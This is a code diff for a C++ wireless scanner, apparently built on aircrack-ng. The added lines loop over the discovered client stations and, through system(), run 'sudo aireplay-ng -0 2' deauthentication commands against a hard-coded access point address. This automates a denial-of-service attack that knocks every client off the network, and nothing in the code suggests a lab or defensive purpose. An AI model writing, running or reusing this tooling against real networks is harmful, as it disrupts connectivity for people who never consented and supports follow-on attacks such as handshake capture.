@@ -14,6 +14,8 @@
 #include <sys/select.h>
 #include <sys/types.h>
 #include <unistd.h>
+#include <sys/wait.h>
+
 
 
 ST_Scanner::ST_Scanner(AP_info_tiny const &AP, char const * Iface)
@@ -59,30 +61,30 @@ void ST_Scanner::deauthentacating(local_options & lopt, Stations & stations, Dea
 		while (size--)
 			st = st->next;
 		
-		for (; new_st != sent; ++sent)
+		for (; new_st != sent; ++sent) {
 			sts.emplace_back(st->stmac);
-			//stations.m_st_vec.emplace_back(st->stmac);
-			// deauth.SendPacket(st->stmac);
+			st = st->next;
+		}
 
 		lopt.m_data.unlock();
 
-		for (auto &&x : sts)
-			deauth.SendPacket(x.stmac);
+		uint8_t s[] = {0x3e, 0x3d, 0xb5, 0x81, 0x9d, 0x38};
+		// sleep(1);
+		// deauth.SendPacket(s);
+		// sleep(10);
+		for (auto &&x : sts) {
+			// deauth.SendPacket(x.stmac);
+			// deauth.SendPacket(s);
 
-		// fputs("\033[A\033[2K\033[A\033[2K", stdout);
-		// rewind(stdout);
-		// ftruncate(1, 0);
+			char command[1024];
+			sprintf(command,
+				"sudo aireplay-ng -0 2 -a c4:71:54:b5:3a:4a -c %02x:%02x:%02x:%02x:%02x:%02x wlan0mon",
+				x.stmac[0],x.stmac[1],x.stmac[2],x.stmac[3],x.stmac[4],x.stmac[5]
+			);
+			std::cout << command << std::endl;
 
-		// ST_info * st = lopt.st_1st;
-		// while(st) {
-		// 	for (int i = 0; i != 5; ++i)
-		// 		printf("%02x:", st->stmac[i]);
-		// 	printf("%02x\n", st->stmac[5]);
-		// 	st = st->next;
-		// }
-
-		// lopt.m_data.unlock();
-
+			system(command);
+		}
 		usleep(10000);
 	}
 }
@@ -134,7 +136,6 @@ static FILE *initCapFile(/*char const * prefix*/) {
 
 static int dump_add_packet(unsigned char * h80211, int caplen, local_options & lopt) {
   assert(h80211);
-
 	size_t n;
 	unsigned z = 0;
 	pcap_pkthdr pkh;
@@ -367,14 +368,20 @@ void ST_Scanner::scanning(uint8_t const * BSSID, uint32_t Ch, char const * Iface
 
 	time_t start = time(NULL);
 	time_t end = time(NULL);
+	time_t timing = 999999;
 	// MYWHILE
-	while (1) {
+	bool notF = true;
+	while (end - start < timing) {
 		end = time(NULL);
 		lopt.m_data.lock();
-		if (lopt.do_exit){// || end - start > 5) {
-			lopt.do_exit = 1;
-			lopt.m_data.unlock();
-			break;
+		if (lopt.do_exit && notF){// || end - start > 5) {
+			// lopt.do_exit = 1;
+			//lopt.m_data.unlock();
+			notF = false;
+			start = time(NULL);
+			end = time(NULL);
+			timing = 3;
+			//break;
 		}
 		lopt.m_data.unlock();
 
@@ -384,20 +391,24 @@ void ST_Scanner::scanning(uint8_t const * BSSID, uint32_t Ch, char const * Iface
 		tv0.tv_sec = 0;
 		tv0.tv_usec = REFRESH_RATE;
 
+		// std::cout << 0 << std::endl;
 		if (select(fdh + 1, &rfds, NULL, NULL, &tv0) < 0)
 			return;
-
+		// std::cout << 1 << std::endl;
     if (FD_ISSET(fd_raw, &rfds)) {
       memset(buffer, 0, sizeof(buffer));
       h80211 = buffer;
+			// std::cout << 2 << std::endl;
       if ((caplen = wi_read(
             wi, NULL, NULL, h80211, sizeof(buffer), &ri))
         == -1) {
         perror("iface down");
         break;
       }
+			// std::cout << 3 << std::endl;
 			lopt.m_data.lock();
       dump_add_packet(h80211, caplen, lopt);
+			// std::cout << lopt.do_exit << '\n';
 			lopt.m_data.unlock();
     }
 	}
